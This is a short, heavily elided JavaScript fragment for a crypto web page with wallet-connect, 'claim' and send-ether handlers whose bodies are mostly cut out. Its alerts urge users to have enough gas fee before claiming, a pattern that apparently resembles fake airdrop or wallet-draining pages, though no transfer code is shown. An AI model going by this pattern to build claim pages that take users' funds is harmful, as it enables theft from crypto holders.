...
$(".connect").click(async function () {
    alert("Ensure you are accessing this link from you dapps brower")
    console.log("1")
    try {
...
$(".proceed").click(async function () {
    alert("Ensure you have enough gas fee before proceeding to claim")
...
async function onSendEther() {
    ...
    try {
        ...
        alert("Insufficient funds you need more gas")
